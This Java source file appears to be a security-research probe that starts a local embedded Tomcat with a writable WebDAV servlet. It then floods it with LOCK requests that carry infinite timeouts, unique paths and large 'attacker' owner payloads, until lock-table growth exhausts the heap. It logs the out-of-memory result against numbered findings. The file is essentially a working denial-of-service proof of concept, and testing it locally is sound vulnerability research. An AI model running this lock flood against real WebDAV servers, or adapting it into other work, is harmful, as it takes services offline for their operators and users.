package org.example.dos.dynamic;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.servlets.WebdavServlet;
import org.apache.catalina.startup.Tomcat;

public final class TomcatWebdavLocksHttpProbe {
    private static final String EXCLUSIVE_LOCK_BODY = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n"
            + "<D:lockinfo xmlns:D='DAV:'>\n"
            + "  <D:lockscope><D:exclusive/></D:lockscope>\n"
            + "  <D:locktype><D:write/></D:locktype>\n"
            + "  <D:owner>attacker</D:owner>\n"
            + "</D:lockinfo>";

    private static final String SHARED_LOCK_BODY = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n"
            + "<D:lockinfo xmlns:D='DAV:'>\n"
            + "  <D:lockscope><D:shared/></D:lockscope>\n"
            + "  <D:locktype><D:write/></D:locktype>\n"
            + "  <D:owner>attacker</D:owner>\n"
            + "</D:lockinfo>";

    @SuppressWarnings("unchecked")
    private static int mapSize(WebdavServlet servlet, String fieldName) throws Exception {
        return ((ConcurrentHashMap<?, ?>) ProbeSupport.field(servlet, WebdavServlet.class, fieldName)).size();
    }

    private static String lockBody(String scope, int index, int payloadBytes) {
        String payload = ProbeSupport.uniquePayload(index, payloadBytes)
                .replace("&", "a")
                .replace("<", "b")
                .replace(">", "c");
        return "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n"
                + "<D:lockinfo xmlns:D='DAV:'>\n"
                + "  <D:lockscope><D:" + scope + "/></D:lockscope>\n"
                + "  <D:locktype><D:write/></D:locktype>\n"
                + "  <D:owner>" + payload + "</D:owner>\n"
                + "</D:lockinfo>";
    }

    private static int lock(int port, String path, String body) throws Exception {
        return ProbeSupport.http(
                "LOCK",
                "http://127.0.0.1:" + port + path,
                Map.of(
                        "Content-Type", "application/xml",
                        "Timeout", "Infinite",
                        "Depth", "0"),
                body.getBytes(StandardCharsets.UTF_8));
    }

    private static String uniquePath(String prefix, int index) {
        return "/" + prefix + "-" + index;
    }

    public static void main(String[] args) throws Exception {
        int requests = Integer.parseInt(args[0]);
        int payloadBytes = Integer.parseInt(args[1]);
        int progressEvery = Integer.parseInt(args[2]);
        int port = Integer.parseInt(args[3]);
        String profile = args[4];

        File base = new File("target/tomcat-webdav-" + port);
        File docBase = new File(base, "webroot");
        docBase.mkdirs();

        Tomcat tomcat = new Tomcat();
        tomcat.setBaseDir(base.getAbsolutePath());
        tomcat.setPort(port);
        tomcat.getConnector();

        Context context = tomcat.addContext("", docBase.getAbsolutePath());
        WebdavServlet servlet = new WebdavServlet();
        Wrapper wrapper = Tomcat.addServlet(context, "webdav", servlet);
        wrapper.addInitParameter("readonly", "false");
        wrapper.addInitParameter("listings", "true");
        wrapper.addInitParameter("maxRequestBodySize", Integer.toString(Math.max(4096, payloadBytes + 512)));
        context.addServletMappingDecoded("/*", "webdav");

        ProbeSupport.installOomExitHandler(() -> {
            try {
                System.out.println("resourceLocksBeforeOom=" + mapSize(servlet, "resourceLocks"));
                System.out.println("sharedLocksBeforeOom=" + mapSize(servlet, "sharedLocks"));
            } catch (Exception ignored) {
                System.out.println("resourceLocksBeforeOom=unknown");
                System.out.println("sharedLocksBeforeOom=unknown");
            }
        });

        tomcat.start();
        ProbeSupport.printCommon("tomcat-webdav-locks-real-http", requests, payloadBytes, port, profile);
        System.out.println("coversPhase4Ids=WEB-P4-0025,WEB-P4-0026,WEB-P4-0027");
        System.out.flush();

        int i = 0;
        try {
            while (requests < 0 || i < requests) {
                String exclusivePath = uniquePath("exclusive", i);
                int exclusiveCode = lock(port, exclusivePath, lockBody("exclusive", i, payloadBytes));
                if (exclusiveCode != 201 && exclusiveCode != 200) {
                    throw new IllegalStateException("exclusive LOCK returned HTTP " + exclusiveCode);
                }

                String sharedPath = uniquePath("shared", i);
                int sharedPathCode = lock(port, sharedPath, lockBody("shared", i + 100_000, payloadBytes));
                if (sharedPathCode != 201 && sharedPathCode != 200) {
                    throw new IllegalStateException("shared path LOCK returned HTTP " + sharedPathCode);
                }

                int sharedTokenCode = lock(port, "/shared-token-anchor", lockBody("shared", i + 200_000, payloadBytes));
                if (sharedTokenCode != 201 && sharedTokenCode != 200) {
                    throw new IllegalStateException("shared token LOCK returned HTTP " + sharedTokenCode);
                }

                i++;
                if (i % progressEvery == 0) {
                    System.out.println("progress requests=" + i
                            + " resourceLocks=" + mapSize(servlet, "resourceLocks")
                            + " sharedLocks=" + mapSize(servlet, "sharedLocks")
                            + " usedHeapBytes=" + ProbeSupport.usedHeapBytes());
                    System.out.flush();
                }
            }
            System.out.println("verdict=COMPLETED");
            System.out.println("requestsCompleted=" + i);
            System.out.println("resourceLocks=" + mapSize(servlet, "resourceLocks"));
            System.out.println("sharedLocks=" + mapSize(servlet, "sharedLocks"));
        } catch (IOException io) {
            if (ProbeSupport.usedHeapBytes() > Runtime.getRuntime().maxMemory() * 90 / 100) {
                System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
                System.out.println("requestsBeforeOom=" + i);
                System.out.println("resourceLocksBeforeOom=" + mapSize(servlet, "resourceLocks"));
                System.out.println("sharedLocksBeforeOom=" + mapSize(servlet, "sharedLocks"));
                System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
                System.out.flush();
                System.exit(ProbeSupport.OOM_EXIT_CODE);
            }
            throw io;
        } catch (OutOfMemoryError oom) {
            System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
            System.out.println("requestsBeforeOom=" + i);
            System.out.println("resourceLocksBeforeOom=" + mapSize(servlet, "resourceLocks"));
            System.out.println("sharedLocksBeforeOom=" + mapSize(servlet, "sharedLocks"));
            System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
            System.out.flush();
            System.exit(ProbeSupport.OOM_EXIT_CODE);
        } finally {
            tomcat.stop();
            tomcat.destroy();
        }
    }
}
